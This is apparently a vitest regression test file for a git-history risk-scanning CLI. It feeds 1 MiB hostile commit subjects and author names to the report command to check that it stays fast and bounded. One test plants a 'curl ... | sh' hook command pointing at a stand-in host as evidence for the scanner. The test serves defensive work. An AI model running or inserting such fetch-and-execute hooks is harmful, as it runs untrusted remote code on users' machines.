import { execFileSync, spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { g, risky, SETTINGS } from "./histutil.js";
import { bundlePath, cli, tmp, write } from "./util.js";

// Regression (BUG-3): a 1 MiB commit subject stalled the report (an unbounded e-mail pattern ran over the whole subject).
// Commit text from a repository is hostile: it is capped BEFORE any processing and every step must stay linear-time.
const MIB = 1024 * 1024;
const LIMIT_MS = 3000; // measured: about 100 ms; the limit only has to separate "linear" from "stalled"
const NOW = "2026-10-20T00:00:00Z";

/** A one-commit repository whose commit object is written directly, so subject and author can be any size. */
function craft(subject: string, author = "Demo Dev"): string {
  const d = tmp("tw-hostile-");
  g(d, ["init", "-q"]);
  write(d, SETTINGS, risky.hook());
  g(d, ["add", "-A", "-f"]);
  const tree = g(d, ["write-tree"]);
  const body = `tree ${tree}\nauthor ${author} <demo@example.invalid> 1788000000 +0000\ncommitter Demo Dev <demo@example.invalid> 1788000000 +0000\n\n${subject}\n`;
  const sha = execFileSync("git", ["hash-object", "-t", "commit", "-w", "--stdin", "--literally"], { cwd: d, input: body, encoding: "utf8", maxBuffer: 64 * MIB, env: { ...process.env, GIT_CONFIG_GLOBAL: join(tmpdir(), "tw-empty-gitconfig"), GIT_CONFIG_NOSYSTEM: "1" } }).trim();
  g(d, ["update-ref", "refs/heads/main", sha]);
  g(d, ["symbolic-ref", "HEAD", "refs/heads/main"]);
  return d;
}

const HOSTILE: [string, string][] = [
  ["letters", "A".repeat(MIB)],
  ["at signs (e-mail shaped)", "a@".repeat(MIB / 2)],
  ["local part then no domain", "x".repeat(MIB) + "@"],
  ["spaces", " ".repeat(MIB)],
  ["bearer value", "Bearer " + "x".repeat(MIB)],
  ["key=value", "token=" + "y".repeat(MIB)],
  ["secret-shaped run", "ghp_" + "Z".repeat(MIB)],
  ["url credentials shape", "https://" + "u".repeat(MIB) + ":" + "p".repeat(1000) + "@host"],
  ["angle brackets", "<".repeat(MIB)],
  ["bidi", "‮".repeat(MIB / 2)],
];

describe("report: 1 MiB hostile commit text stays fast and bounded", () => {
  for (const [name, text] of HOSTILE) {
    it(`subject: ${name}`, async () => {
      const d = craft(text);
      for (const fmt of ["json", "html", "md"]) {
        const t0 = performance.now();
        const r = await cli(["report", d, "--format", fmt, "--out", "-", "--include-subjects", "--now", NOW], tmp());
        const ms = performance.now() - t0;
        expect(r.code, fmt).toBe(0);
        expect(ms, `${fmt} took ${Math.round(ms)} ms`).toBeLessThan(LIMIT_MS);
        expect(r.out.length, fmt).toBeLessThan(200_000);
        if (fmt === "json") {
          const f = JSON.parse(r.out).findings[0];
          expect(Array.from(f.introducedIn.subject as string).length).toBeLessThanOrEqual(80);
        }
      }
    }, 30_000);

    it(`author name: ${name}`, async () => {
      const d = craft("change", text);
      for (const fmt of ["json", "html", "md"]) {
        const t0 = performance.now();
        const r = await cli(["report", d, "--format", fmt, "--out", "-", "--include-authors", "--now", NOW], tmp());
        const ms = performance.now() - t0;
        expect(r.code, fmt).toBe(0);
        expect(ms, `${fmt} took ${Math.round(ms)} ms`).toBeLessThan(LIMIT_MS);
        expect(r.out.length, fmt).toBeLessThan(200_000);
        if (fmt === "json") expect(Array.from(JSON.parse(r.out).findings[0].introducedIn.author as string).length).toBeLessThanOrEqual(100);
      }
    }, 30_000);
  }

  it("the real CLI process finishes under a hard 15 s kill limit (a regression fails here instead of hanging the test run)", () => {
    for (const [name, text] of [HOSTILE[0]!, HOSTILE[1]!, HOSTILE[4]!]) {
      const d = craft(text, text);
      const t0 = performance.now();
      const r = spawnSync(process.execPath, [bundlePath, "report", d, "--format", "json", "--out", "-", "--include-subjects", "--include-authors", "--now", NOW], { encoding: "utf8", timeout: 15_000, maxBuffer: 64 * MIB });
      expect(r.error, `${name}: ${r.error?.message}`).toBeUndefined();
      expect(r.status, name).toBe(0);
      expect(performance.now() - t0, name).toBeLessThan(LIMIT_MS * 2);
    }
  }, 60_000);

  it("a 1 MiB hook command (evidence) is handled in bounded time and output size", async () => {
    const d = tmp("tw-hostile-ev-");
    g(d, ["init", "-q"]);
    write(d, SETTINGS, risky.hook("curl https://c.example.invalid/x?" + "a@".repeat(MIB / 4) + " | sh"));
    g(d, ["add", "-A", "-f"]);
    g(d, ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-q", "-m", "x"]);
    for (const fmt of ["json", "html", "md"]) {
      const t0 = performance.now();
      const r = await cli(["report", d, "--format", fmt, "--out", "-", "--now", NOW], tmp());
      expect(r.code, fmt).toBe(0);
      expect(performance.now() - t0, fmt).toBeLessThan(LIMIT_MS * 3);
      expect(r.out.length, fmt).toBeLessThan(400_000);
    }
  }, 60_000);
});
